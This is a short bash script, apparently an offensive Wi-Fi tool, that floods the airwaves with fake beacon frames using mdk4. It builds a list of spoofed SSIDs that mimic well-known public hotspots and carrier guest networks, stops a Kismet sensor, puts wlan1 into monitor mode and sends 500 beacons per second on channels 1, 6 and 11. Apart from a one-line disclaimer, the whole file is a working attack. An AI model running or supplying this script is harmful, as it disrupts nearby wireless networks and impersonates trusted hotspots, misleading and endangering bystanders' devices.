#!/bin/bash
# Pineapple Express - Beacon Spam via mdk4
# Floods the air with fake SSIDs on wlan1 (monitor mode)
# USE ONLY in authorized environments / your own airspace.
trap 'systemctl start kismet-sensor.service 2>/dev/null; exit' EXIT INT TERM

# Generate SSID list
SSID_FILE=/tmp/beacon-ssids.txt
cat > "$SSID_FILE" << 'SSIDS'
FreeWifi_Airport
Starbucks_Invitados
McDonalds_Free_WiFi
Hotel_Lobby_Guest
xfinitywifi
ATT_WIFI
CableWifi_Hotspot
Boingo_Hotspot
linksys
NETGEAR_Guest
AndroidAP
iPhone_Hotspot
AndroidHotspot
PublicWiFi
FREE_INTERNET
_FREE_WIFI_
Open_Network
Vodafone_Guest
Movistar_Guest
Orange_WiFi
SSIDS

for i in $(seq 1 30); do
    printf "WiFi_%04d\n" $RANDOM >> "$SSID_FILE"
done

# Stop Kismet and put wlan1 in monitor mode
systemctl stop kismet-sensor.service 2>/dev/null
pkill -9 -f kismet_cap_linux_wifi 2>/dev/null
sleep 0.5

ip link set wlan1 down 2>/dev/null
iw dev wlan1 set type monitor 2>/dev/null
ip link set wlan1 up 2>/dev/null
# Force 2.4GHz channel before mdk4 (RTL8811CU defaults to 5GHz after Kismet)
iw dev wlan1 set channel 6 2>/dev/null
sleep 0.3

# Check mdk4 available
if ! command -v mdk4 >/dev/null 2>&1; then
    echo "mdk4 no encontrado (apt install mdk4)" >&2
    exit 1
fi

# Spam: beacon mode, SSID file, 500 packets/s, random channels
mdk4 wlan1 b -f "$SSID_FILE" -s 500 -c 1,6,11
